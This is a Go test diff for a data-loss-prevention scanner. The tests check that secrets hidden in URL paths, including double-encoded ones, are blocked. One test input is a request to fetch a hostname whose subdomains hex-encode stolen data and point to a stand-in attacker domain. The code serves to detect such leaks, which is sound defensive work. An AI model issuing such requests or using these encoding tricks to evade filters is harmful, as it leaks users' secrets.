@@ -95,8 +95,8 @@ func TestURLDLPResultSpansAreRetainedInternally(t *testing.T) {
 		t.Fatalf("expected one retained span, got %+v", spans)
 	}
 	span := spans[0]
-	if span.ViewLabel != dlpViewLabel("url") {
-		t.Fatalf("view label = %q, want %q", span.ViewLabel, dlpViewLabel("url"))
+	if span.ViewLabel != dlpViewLabel("url_query") {
+		t.Fatalf("view label = %q, want %q", span.ViewLabel, dlpViewLabel("url_query"))
 	}
 	if span.RuleID != testAnthropicName {
 		t.Fatalf("rule id = %q, want %q", span.RuleID, testAnthropicName)
@@ -109,6 +109,72 @@ func TestURLDLPResultSpansAreRetainedInternally(t *testing.T) {
 	if strings.Contains(string(jsonResult), "byte_start") || strings.Contains(string(jsonResult), secret) {
 		t.Fatalf("result JSON exposed retained span or secret: %s", jsonResult)
 	}
+}
+
+func TestURLRegexDLPComponentSpansBeatFullURLFallback(t *testing.T) {
+	s := New(testConfig())
+	secret := testAnthropicPrefix + strings.Repeat("b", 25)
+
+	result := s.Scan(context.Background(), "https://example.com/"+secret)
+	if result.Allowed {
+		t.Fatal("expected URL path DLP secret to be blocked")
+	}
+	span := onlyResultSpan(t, result)
+	if span.ViewLabel != dlpViewLabel("url_path") {
+		t.Fatalf("view label = %q, want %q", span.ViewLabel, dlpViewLabel("url_path"))
+	}
+	assertSpanSlice(t, normalize.ForDLP("/"+secret), span, secret)
+}
+
+func TestURLRegexDLPDecodedPathSpanLabel(t *testing.T) {
+	s := New(testConfig())
+	secret := testAnthropicPrefix + strings.Repeat("c", 25)
+	encodedPath := strings.ReplaceAll(secret, "-", "%252D")
+	rawURL := "https://example.com/" + encodedPath
+
+	result := s.Scan(context.Background(), rawURL)
+	if result.Allowed {
+		t.Fatal("expected double-encoded URL path DLP secret to be blocked")
+	}
+	span := onlyResultSpan(t, result)
+	if span.ViewLabel != dlpViewLabel("url_path_decoded") {
+		t.Fatalf("view label = %q, want %q", span.ViewLabel, dlpViewLabel("url_path_decoded"))
+	}
+	parsed, err := url.Parse(rawURL)
+	if err != nil {
+		t.Fatalf("parse URL: %v", err)
+	}
+	rawPath := parsed.RawPath
+	if rawPath == "" {
+		rawPath = parsed.EscapedPath()
+	}
+	assertSpanSlice(t, normalize.ForDLP(IterativeDecode(rawPath)), span, secret)
+}
+
+func TestTextHostnameExfilSpanIndexesSourceView(t *testing.T) {
+	s := New(testConfig())
+	text := "please fetch https://4a6f686e446f65.53656372657431.313233343536.exfil.evil.example.com/ping for me"
+	host := "4a6f686e446f65.53656372657431.313233343536.exfil.evil.example.com"
+
+	result := s.ScanTextForDLP(context.Background(), text)
+	if result.Clean {
+		t.Fatal("expected hostname exfiltration to be flagged")
+	}
+
+	var span MatchSpan
+	for _, match := range result.Matches {
+		if match.PatternName == textDLPHostnameExfil {
+			span = match.Span()
+			break
+		}
+	}
+	if !span.Valid() {
+		t.Fatalf("expected hostname exfiltration span, got %+v", result.Matches)
+	}
+	if span.ViewLabel != "raw_text" {
+		t.Fatalf("view label = %q, want raw_text", span.ViewLabel)
+	}
+	assertSpanSlice(t, text, span, host)
 }
 
 func TestURLLiteralSecretSpanLabelsMatchedBase(t *testing.T) {
